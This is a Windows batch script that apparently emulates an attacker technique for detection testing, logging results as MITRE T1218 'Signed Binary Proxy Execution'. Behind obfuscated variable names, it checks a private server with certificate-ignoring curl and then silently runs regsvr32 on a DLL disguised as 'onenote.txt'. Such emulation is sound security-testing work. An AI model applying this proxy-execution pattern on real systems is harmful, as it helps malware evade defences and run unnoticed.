@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\7617\43663656
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7617-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=onenote.txt
SET rgnpbq=7617

SET zbqap=%APPDATA%\!fkesh!
SET llpqj=!zbqap!\macula-simulations.log
SET cixme=T1218|Signed Binary Proxy Execution
SET yvjfk=0
SET qynzx=
SET pznxw=%SystemRoot%\System32\curl.exe

REM Check server availability (Step 1)
IF EXIST "!pznxw!" (
    "!pznxw!" -k -s -o nul "!frytcn!"
) ELSE (
    SET qynzx=curl_not_found
)

REM Go to output dir (Step 3)
2>nul cd /d "!douyiw!"
IF NOT !ERRORLEVEL! EQU 0 (
    SET yvjfk=0
    SET qynzx=cannot_access_dir
    GOTO log_ttp
)

REM Execute DLL via regsvr32 (Step 4)
"%SystemRoot%\System32\regsvr32.exe" /s "!ecrfwq!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    SET yvjfk=1
) ELSE (
    SET yvjfk=0
    SET qynzx=regsvr32_failed
)

:log_ttp
REM Build timestamp
SET dthb=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2!
SET tmhb=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
SET tmsy=!dthb! !tmhb!

REM Format and append log line
2>nul (
    ECHO [!tmsy!][!eykalkg!]: !fkesh!-!rgnpbq!-!cixme!=!yvjfk!:!qynzx!>>"!llpqj!"
)

ENDLOCAL